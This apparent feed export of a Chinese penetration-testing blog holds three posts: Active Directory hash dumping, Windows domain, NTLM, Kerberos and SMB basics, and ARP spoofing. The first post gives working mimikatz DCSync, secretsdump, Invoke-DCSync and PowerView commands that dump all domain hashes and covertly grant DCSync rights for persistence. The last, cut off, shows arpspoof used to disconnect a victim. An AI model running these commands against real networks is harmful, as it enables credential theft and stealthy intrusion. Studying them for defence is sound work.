title="Impacket"></a>Impacket</h4><p>impacket框架集成了许多好玩的东西，他其中的secretdump.py脚本实现了解析ntds.dit的功能</p><p>直接再impacket的example下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\secretsdump.py -system .\system.hive -ntds .\ntds.dit local</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729235923711.png" alt="image-20210729235923711"></p><h3 id="远程解析"><a href="#远程解析" class="headerlink" title="远程解析"></a>远程解析</h3><h4 id="DCSYNC"><a href="#DCSYNC" class="headerlink" title="DCSYNC"></a>DCSYNC</h4><p>“DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限。”</p><p>这个东西 可以实现不登录到域控而获取域控上的数据<br>获得以下权限就可以使用了</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>然后在mimikatz里<br>privilege::debug<br>lsadump::dcsync /user:xxxx /domain:xxxxx /csv 即可</p><p>想获取全部hash也可以lsadump::dcsync /domain:xxx.com /all /csv</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133813.png" alt="QQ截图20210217133813"></p><p>然后我们就可以通过krbtgt hash制作黄金票据登录administrator。<br>如果还想隐蔽一点，可以给普通用户添加如下ACE,使其获得dcsync权限</p><ul><li></li><li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li></ul><p>可以以管理员权限运行powerview.ps1完成以上操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#给域用户hack添加以上三条ACE</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#给域用户hack删除以上三条ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>然后普通用户也可以用mimikatz调用dcsync导出hash了</p><h4 id="DCSYNC的powershell实现"><a href="#DCSYNC的powershell实现" class="headerlink" title="DCSYNC的powershell实现"></a>DCSYNC的powershell实现</h4><p>mimikatz免杀过不去的话可以试试这个<a href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    &#x2F;&#x2F; 导出域内所有用户的hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      &#x2F;&#x2F; 导出域内administrator账户的hash</span><br></pre></td></tr></table></figure><p>我这里WIN10域控打不通，不知道为啥</p><h5 id="配合EXCHANGE用户达到域提权目的"><a href="#配合EXCHANGE用户达到域提权目的" class="headerlink" title="配合EXCHANGE用户达到域提权目的"></a>配合EXCHANGE用户达到域提权目的</h5><p>前提:一个exchange高权限组的用户控制权，一个机器账户</p><p>exchange安装后会在AD上生成两个容器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png" alt="QQ截图20210217141602"></p><p>其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。<br>其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png" alt="QQ截图20210217141614"></p><p>假设我们已经拿到了exchange trusted subsystem中一个用户的控制权。<br>那么就可用dysync进行权限维持了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;横向移动&quot;&gt;&lt;a href=&quot;#横向移动&quot; class=&quot;headerlink&quot; title=&quot;横向移动&quot;&gt;&lt;/a&gt;横向移动&lt;/h1&gt;&lt;h2 id=&quot;PTH&quot;&gt;&lt;a href=&quot;#PTH&quot; class=&quot;headerlink&quot; title=&quot;PTH&quot;&gt;&lt;/a&gt;PT</summary>
      
    
    
    
    
    <category term="内网渗透与权限维持" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>windows内网基础</title>
    <link href="http://const27.com/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/"/>
    <id>http://const27.com/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/</id>
    <published>2021-06-28T13:51:58.220Z</published>
    <updated>2021-09-03T13:18:02.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="域，工作组，活动目录"><a href="#域，工作组，活动目录" class="headerlink" title="域，工作组，活动目录"></a>域，工作组，活动目录</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>工作组可以认为是同一网络内，功能相似的电脑进行的分组。<br>举个例子：<br>“在一个网络内，可能有成百上千台电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。为了解决这一问题，Windows 9x/NT/2000就引用了“工作组”这个概念，将不同的电脑一般按功能分别列入不同的组中，如财务部的电脑都列入“财务部”工作组中，人事部的电脑都列入“人事部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。 ”<br>这就是工作组，但是在工作组中的电脑还是各自管理。当其中一台计算机访问另一台计算机时还是要经过另一台计算机的认证的</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域，是一群相互信任的计算机的集合<br>想要访问域中资源就必须经过一台负责每一台联入网络的电脑和用户的验证工作的服务器，这个服务器叫做 域控制器 （Domain Controller，简写为DC） 的安全认证。每个域至少要有一个域控制器。<br>当某计算机连入域时，DC就会鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息不正确，域控制器就拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源 。<br>另外，当一个域和另一个域建立信任关系后，两个域就可以按需要相互管理</p><h2 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h2><p>“ 工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。 ”</p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>活动目录 (Active Directory,AD) ,用于存储有关网络对象的信息。帮助用户快速准确的找到所需的信息服务,“ 如果把企业的内网看成一本字典，那么<strong>内网里的资源就是字典里的内容，活动目录就相当于字典的索引</strong> ”</p><p>活动目录的功能：</p><ul><li>账号集中管理</li><li>软件集中管理</li><li>环境集中管理</li><li>增强安全性</li><li>更可靠，更短的宕机时间</li></ul><p>“要实现域环境，实际上就是安装AD，<strong>如果内网中的一台计算机上安装了AD，它就变成了DC(用于存储活动目录数据库的计算机)。</strong>”</p><h1 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h1><p>NTLM也是一个认证协议，与Kerberos协议功能是一样的，不过NTLM的安全性可没有Kerberos好</p><h2 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h2><p>NTLM协议验证机制是基于 挑战(chanllage)/回应(response) 模式的</p><p>它的验证模式大致如下:</p><ol><li>用户输入账号密码，本地把密码加密为一个hash值，称为<strong>NTML-Hash</strong></li><li>客户端向服务器发送用户名 （这个数据称为 <strong>TYPE 1 Negotiate</strong> ）</li><li>服务端接收请求，判断数据库中该用户名是否存在，若存在则生成一个16位随机数称之为chanllage。同时将chanllage返回给客户端 （ <strong>TYPE 2</strong> ）</li><li>客户端收到chanllage后将其用上面生成的hash值来加密这个chanllange，并与用户名，chanllange等组合到一起得到<strong>Net-NTLMHash</strong> 最后将 Net-NTLMHash 封装到 <strong>TYPE 3 NTLM_AUTH</strong>消息中发往服务器。</li><li>服务器收到TYPE3后，用自己数据库中该用户的密码的NTML-Hash加密chanllage，并比较自己计算出的 <strong>Net-NTLMHash</strong> 与客户端发过来的 <strong>Net-NTLMHash</strong> ，若相同则认证成功</li><li>（以上是客户端-服务端模型，若是在域中，验证步骤就会有点不同）<br>若在域中，那么服务端在第5步收到TYPE3后不会自行进行比对，而是将 Net NTLM-Hash 转发给域控制器DC，由DC进行最后的 Net NTLM-Hash 比较认证</li></ol><h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos协议，是一个常用的认证与授权协议(下面只是简化过的大致流程，具体流程请看下面的wireshark抓包分析)</p><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217011242.png" alt="QQ图片20210217011242"></p><h2 id="参与的关键角色"><a href="#参与的关键角色" class="headerlink" title="参与的关键角色"></a>参与的关键角色</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217011359.png" alt="QQ图片20210217011359"></p><ul><li><strong>Client</strong>: Application Client 应用客户端</li><li><strong>AS</strong>: Authentication Server 用来认证用户身份</li><li><strong>TGS</strong>: Ticket-Granting Service 用来授权服务访问</li><li><strong>SS</strong>: Service Server 用户所请求的服务</li><li>其中AS和TGS都属于KDC系统（ 密钥分发中心 ）</li></ul><h2 id="认证："><a href="#认证：" class="headerlink" title="认证："></a>认证：</h2><p>以下的加密都是对称加密</p><h3 id="1-用户登录"><a href="#1-用户登录" class="headerlink" title="1.用户登录"></a>1.用户登录</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217125043.png" alt="QQ图片20210217125043"></p><p>用户先输入用户名和密码，其中密码在这个阶段会被单向hash函数加密为一个密钥，用来解密后面的信息</p><h3 id="2-请求身份认证（client和kdc双向认证）"><a href="#2-请求身份认证（client和kdc双向认证）" class="headerlink" title="2.请求身份认证（client和kdc双向认证）"></a>2.请求身份认证（client和kdc双向认证）</h3><h4 id="2-1-客户端向AS发送认证请求"><a href="#2-1-客户端向AS发送认证请求" class="headerlink" title="2.1 客户端向AS发送认证请求"></a>2.1 客户端向AS发送认证请求</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125323.png" alt="QQ截图20210217125323"></p><p>客户端向as发送用户名信息（明文）（进发送用户名而没有发送密码）</p><h4 id="2-2AS确认客户端身份"><a href="#2-2AS确认客户端身份" class="headerlink" title="2.2AS确认客户端身份"></a>2.2AS确认客户端身份</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125335.png" alt="QQ截图20210217125335"></p><p>AS先把用户名在数据库中查找一下，如果该用户名存在则找到该用户的密码使用单向hash函数生成client密钥并返回Msg A和B。<br>A中的内容是一个被Client密钥加密的用于生成Authenticator1的数据<br>B中的内容是一个被TGS密钥加密的一堆信息叫做<strong>TGT</strong>，当前无TGS密钥故无法解开，其中包含 客户端ID，有效期 ，Client网络地址以及MSG A解密后的内容</p><h3 id="3-请求服务授权（client请求kdc认证server）"><a href="#3-请求服务授权（client请求kdc认证server）" class="headerlink" title="3. 请求服务授权（client请求kdc认证server）"></a>3. 请求服务授权（client请求kdc认证server）</h3><h4 id="3-1-客户端向TGS发送请求服务授权请求"><a href="#3-1-客户端向TGS发送请求服务授权请求" class="headerlink" title="3.1 客户端向TGS发送请求服务授权请求"></a>3.1 客户端向TGS发送请求服务授权请求</h4><p><img src="http://www.nosqlnotes.com/wp-content/uploads/2017/12/3.1%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E8%AE%BF%E9%97%AE.png" alt="3.1客户端请求授权服务访问"></p><p>Client在MSG C向TGS发送 请求的服务的ID，2.2中的TGT，MSG D 发送由 **[Client/TGS SessionKey]**加密的Authenticator 1 {Client ID, Timestamp}。</p><h4 id="3-2-TGS为Client响应服务授权票据"><a href="#3-2-TGS为Client响应服务授权票据" class="headerlink" title="3.2 TGS为Client响应服务授权票据"></a>3.2 TGS为Client响应服务授权票据</h4><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125347.png" alt="QQ截图20210217125347" style="zoom:150%;" /><ul><li><p>Msg E</p><p>  使用</p><p>[Service密钥]</p><p>加密的Client-To-Server Ticket, 该Ticket中包含了如下信息:</p><ul><li><strong>[Client/Server SessionKey]</strong></li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></li><li><p><strong>Msg F</strong>  使用**[Client/TGS SessionKey]<strong>加密的</strong>[Client/Server SessionKey]**。</p></li></ul><h3 id="4-发送服务请求（client与ss双向认证）"><a href="#4-发送服务请求（client与ss双向认证）" class="headerlink" title="4. 发送服务请求（client与ss双向认证）"></a>4. 发送服务请求（client与ss双向认证）</h3><h5 id="4-1-Client向SS-Service-Server-发送服务请求"><a href="#4-1-Client向SS-Service-Server-发送服务请求" class="headerlink" title="4.1 Client向SS(Service Server)发送服务请求"></a>4.1 Client向SS(Service Server)发送服务请求</h5><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125356.png" alt="QQ截图20210217125356" style="zoom:150%;" /><p>发送的消息中包括：</p><ul><li><strong>Msg E</strong>  上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client为SS携带的消息。</li><li><strong>Msg G</strong>  由**[Client/Server SessionKey]<strong>加密的</strong>Authenticator 2**，包含{Client ID, Timestamp}信息。<br>这里的Authenticator 2区别于前面3.1步骤中的Authenticator 1。</li></ul><p><strong>Note</strong></p><ol><li><strong>[Client/Server SessionKey]**并未直接透明传输，而是被包含在使用</strong>[Service密钥]**加密的Msg E中。</li><li>既然**[Client/Server SessionKey]<strong>并不直接透明传输， Client需要向SS证明自己拥有正确的</strong>[Client/Server SessionKey]<strong>，所以，Authenticator 2使用了</strong>[Client/Server SessionKey]**加密。</li></ol><h4 id="4-2-SS响应Client"><a href="#4-2-SS响应Client" class="headerlink" title="4.2 SS响应Client"></a>4.2 SS响应Client</h4><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125405.png" alt="QQ截图20210217125405" style="zoom:150%;" /><h2 id="Kerberos抓包分析"><a href="#Kerberos抓包分析" class="headerlink" title="Kerberos抓包分析"></a>Kerberos抓包分析</h2><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125405.png" alt="QQ截图20210217125405" style="zoom:150%;" /><p>以上是kerberos协议简化图</p><h3 id="ASREQ"><a href="#ASREQ" class="headerlink" title="ASREQ"></a>ASREQ</h3><p>即客户端往服务端的第一次通讯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125644.png" alt="QQ截图20210217125644"></p><p>我抓到的包的样子,我们来解读一下<br>1.pvno: 标记着kerberos协议的版本<br>2.msg-type: 标记着这个包的类型， ASREQ对应的就是KRBAS_REQ(0x0a)<br>3.padata:用于存储一些认证信息<br>其实这个头下面还有很多不同的类型的头，但是这里抓到了PA-DATA PA-ENC-TIMESTAMP和PA-DATA PA-PAC-REQUEST这两个头部，但是这两个头部是padata最常用最核心的头部.<br>PA-DATA PA-ENC-TIMESTAMP : 就是用户hash加密的时间戳,作用在于:as配合用户的明文账户(cname头)在数据库中查询该用户是否存在，若存在则取用其hash来解密这个时间戳，若揭秘成功则认证通过<br>PA-DATA PA-ENC-TIMESTAMP:  这个是启用PAC(一个控制用户权限的东西)支持的扩展。<br>4.req-body:请求主体，也包含了许多信息.这个头里面比较重要的东西是<br>cname:存储着发送请求的用户名（明文用户名）<br>sname:这个包含的是服务端的身份, 在ASREQ里面是krbtgt ，还有所在域名称。till为到期时间，nonce为随机生成数<br>realm:所在域名称<br>etype:告知服务器，这个hash的加密方式</p><p>之前一直困扰我的 “为什么有些文章说的第一步是向服务器发送明文账户名，有些文章是向服务器发送时间戳hash”问题抓了一下包就懂了..</p><h3 id="ASREP"><a href="#ASREP" class="headerlink" title="ASREP"></a>ASREP</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125844.png" alt="QQ截图20210217125844"></p><p>1.ticket:这个就是TGT了。<br>tkt-vno:票据格式版本号<br>realm:所在域名<br>sname:同asres<br>enc-part:被krbtgt密钥加密的票据本体部分<br>2.enc-part:被client hash 加密的login session key</p><h3 id="TGSREQ"><a href="#TGSREQ" class="headerlink" title="TGSREQ"></a>TGSREQ</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130159.png" alt="QQ截图20210217130159"></p><p>1.ap-req-&gt;…-&gt;tikect: 可以发现TGSREQ把整个TGT发送给了TGS<br>2ap-req-&gt;…-&gt;authenticator:被login session key加密的时间戳和client id</p><h3 id="TGSREP"><a href="#TGSREP" class="headerlink" title="TGSREP"></a>TGSREP</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125903.png" alt="QQ截图20210217125903"></p><p>1.tikect:这里就是TGS部分了。<br>enc-part：这里的enc-part是被所请求的服务的用户hash加密的<br>2.enc-part:被login session key加密的service session key</p><h1 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h1><p>SMB协议是一个用于两台计算机间共享文件 、打印机、串口等功能的协议。<br>网上邻居功能就是依靠SMB协议而起的。<br>通过smb协议，一台计算机可以在经过smb认证后读写另一台计算机上的一些文件。<br>smb协议一般架设在NetBios协议之上。<br>NetBIOS 使用下列端口：UDP/137（NetBIOS 名称服务）、UDP/138（NetBIOS 数据报服务）、TCP/139（NetBIOS 会话服务）；SMB 使用下列端口：TCP/139、TCP/445。</p><h2 id="SMB认证"><a href="#SMB认证" class="headerlink" title="SMB认证"></a>SMB认证</h2><p>如果我们想依靠smb协议去读写另一台计算机上的文件，那么其中的SMB认证情况是如何呢？我们简单分析一下。</p><p>1.版本确立阶段<br>2.用户认证阶段<br>3.资源链接阶段<br>4.资源读写阶段</p><p>更详细一点。<br>1.版本确立阶段。客户端先发送自己支持的SMB协议版本给服务器，服务器收到后向客户端列出希望使用的版本。若客户端支持的smb版本服务器均不支持，则返回 0XFFFFH，结束通信 。<br>2.用户认证阶段。确立好认证版本后，就是客户端发送账户密码给服务端进行身份验证了。服务器收到后返回认证成功或失败<br>3.资源链接阶段。用户认证通过后，客户端发送自己想要访问的资源名，服务器收到后返回允许或拒绝<br>4.资源读写阶段，客户端开始读写服务器上文件。</p><p>看起来比ntlm和kerberos简单多了。抓包分析一下。</p><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>1.1 客户端向服务端列出当前支持的smb版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130121.png" alt="QQ截图20210217130121"></p><p>1.2服务器返回希望的SMB版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130226.png" alt="QQ截图20210217130226"></p><p>1.3这里说个题外话，此时服务器只是选中了SMB2，但是SMB2也分了很多版本，所以客户端还会基于SMB2继续进行版本问询</p><img src="http://www.const27.com/wp-content/uploads/2020/11/image-10.png" alt="img" style="zoom:150%;" /><p>然后服务器再继续选择一个细分版本，版本协商结束</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130238.png" alt="QQ截图20210217130238"></p><p>2.1 客户端向服务端提供用户信息。SMB协议的这一个部分使用NTLM协议完成的。建议先看看NTLM认证再过来<br>首先客户端发送一个请求NTLM认证的包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130252.png" alt="QQ截图20210217130252"></p><p>2.2服务端返回challenge</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130331.png" alt="QQ截图20210217130331"></p><p>2.3 客户端发送用户名，被client hash加密的challenge（NTLM RESPONSE）给服务端</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130400.png" alt="QQ截图20210217130400"></p><p>2.4服务端进行认证处理，返回认证成功或失败，下图是成功时，返回 会话建立字样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130419.png" alt="QQ截图20210217130419"></p><p>3.1客户端发送请求的资源</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130431.png" alt="QQ截图20210217130431"></p><p>3.2服务端返回允许或拒绝</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130454.png" alt="QQ截图20210217130454"></p><ol start="4"><li>各种读写操作请求</li></ol><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130512.png" alt="QQ截图20210217130512"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;域，工作组，活动目录&quot;&gt;&lt;a href=&quot;#域，工作组，活动目录&quot; class=&quot;headerlink&quot; title=&quot;域，工作组，活动目录&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="内网渗透与权限维持" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>ARP欺骗&amp;DNS欺骗&amp;mac泛洪攻击</title>
    <link href="http://const27.com/2021/06/28/ARP%E6%AC%BA%E9%AA%97&amp;DNS%E6%AC%BA%E9%AA%97&amp;mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/"/>
    <id>http://const27.com/2021/06/28/ARP%E6%AC%BA%E9%AA%97&amp;DNS%E6%AC%BA%E9%AA%97&amp;mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/</id>
    <published>2021-06-28T13:51:58.218Z</published>
    <updated>2021-06-28T13:38:48.019Z</updated>
    
    <content type="html"><![CDATA[<h1 id="arp协议与欺骗"><a href="#arp协议与欺骗" class="headerlink" title="arp协议与欺骗"></a>arp协议与欺骗</h1><h2 id="简单概要："><a href="#简单概要：" class="headerlink" title="简单概要："></a>简单概要：</h2><p>通过此协议来获取局域网中某IP地址的mac地址</p><h2 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h2><p>在局域网中的机器互相发送消息时，靠的是mac地址（也叫以太网地址）来确定目的地址的，而我们只知道IP地址，所以需要arp协议来把ip地址映射为mac地址。 具体实现原理是，比如我想知道192.168.1.1的mac地址，就会在广播域里广播arp请求，ip不是192.168.1.1的主机会自动忽略请求，而192.168.1.1主机则会应答请求，并返回自己的mac地址(由IP定位到mac地址)</p><h2 id="arp高速缓存表："><a href="#arp高速缓存表：" class="headerlink" title="arp高速缓存表："></a>arp高速缓存表：</h2><p>这个表用来缓存 ip地址与mac地址 的对应关系<br>有动态表和静态表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">动态表随时间的推移自动添加和删除,每个动态arp缓存都有自己的TTL(生存时间).TTL为0就会被删</span><br><span class="line">静态表是永久性的，手动添加和删除。</span><br></pre></td></tr></table></figure><p><strong>局域网中ip到mac地址解析过程：</strong><br>1.当缓存表中存在目的IP对应的mac地址时 则直接返回与IP对应的mac地址<br>2.当缓存表中没有对应关系时,则向局域网中发送arp广播请求目的IP的mac，收到arp应答后将对应关系记录到高速缓存表中<br><strong>高速缓存表的优缺点</strong>：<br>优点：减少网络通信量，提高通信效率<br>缺点：会造成安全隐患</p><h2 id="arp分组格式"><a href="#arp分组格式" class="headerlink" title="arp分组格式"></a>arp分组格式</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144616.png" alt="QQ截图20210219144616"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.arp请求的目的mac地址  全f时代表广播地址</span><br><span class="line">2.arp请求的来源mac地址</span><br><span class="line">3.字段3 以太网帧类型表示的是后面的数据类型，ARP请求和ARP应答这个值为0x0806</span><br><span class="line">4.字段4 表示硬件地址的类型，硬件地址不只以太网一种，是以太网类型时此值为1</span><br><span class="line">5.字段5 表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x0800</span><br><span class="line">67.字段6和7 表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节</span><br><span class="line">8.操作类型字段，值为1，表示进行ARP请求；值为2，表示进行ARP应答；</span><br><span class="line">               值为3，表示进行RARP请求；值为4，表示进行RARP应答。（重要）</span><br><span class="line">9.字段9 发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。</span><br><span class="line">10.字段10 发送ARP请求或应答的IP地址。</span><br><span class="line">11 12.目的端的硬件地址和协议地址</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144723.png" alt="QQ截图20210219144723"></p><h2 id="免费arp"><a href="#免费arp" class="headerlink" title="免费arp"></a>免费arp</h2><p>免费arp是指主机发送arp查找自己的IP地址,发送端的协议地址和目的端的协议地址是一致的<br><strong>作用：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(如某些网关设备会每隔一定时间广播一次免费arp，让网络中其他主机更新arp缓存表中网关的mac地址，缓解arp攻击效果)</span><br><span class="line">(如黑客可以使用免费arp，将虚假伪造的 ip mac对应关系通过arp广播出去，使网络中其他主机更新arp缓存表，更新完成后，这些主机的数据会转发到错误的mac地址，从而实现arp欺骗）</span><br><span class="line">2.检查广播域里的其他主机有没有使用自己的IP，如果使用了，则会弹出 IP冲突 字样</span><br><span class="line">免费arp与普通arp的区别:</span><br><span class="line">普通arp的请求是 我需要某ip的mac地址，该IP是其他机器的IP地址</span><br><span class="line">免费arp的请求是 我需要某IP的mac地址，该IP是机器自己的IP地址，起到宣告作用，发出去后是不希望得到回应的，若有回应则说明了IP冲突了</span><br></pre></td></tr></table></figure><h2 id="代理arp"><a href="#代理arp" class="headerlink" title="代理arp"></a>代理arp</h2><p>代理arp的意思是，一个主机把自己的mac地址给另一台机器使用来应答其他主机的arp请求。 实际上，这已经是某种意义上的arp欺骗</p><h2 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h2><h3 id="攻击原理："><a href="#攻击原理：" class="headerlink" title="攻击原理："></a>攻击原理：</h3><p>arp攻击就是伪造IP与mac的对应关系来实现arp欺骗，攻击者只要持续不断的发送伪造的arp响应包就能更改目标主机的arp缓存表，造成 断网攻击 或 中间人攻击</p><h3 id="利用arspoof实现断网攻击"><a href="#利用arspoof实现断网攻击" class="headerlink" title="利用arspoof实现断网攻击"></a>利用arspoof实现断网攻击</h3><p>用kali和物理机进行测试，kali是攻击机，物理机是受害者<br>首先收集kali，物理机，网关的ip地址和mac<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150147.png" alt="QQ截图20210219150147"></p><p>假设我们想要在实际中实施攻击，首先需要扫描局域网中的IP，但我们一个一个ping就很浪费时间了，所以需要fping命令<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150203.png" alt="QQ截图20210219150203"><br>解读一下命令 arpspoof -i kali网卡名 -t 被攻击机ip 网关<br>好的，我们物理机成功被断网<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144847.png" alt="QQ截图20210219144847"></p><h2 id="使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包"><a href="#使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包" class="headerlink" title="使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包"></a>使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包</h2><p><img 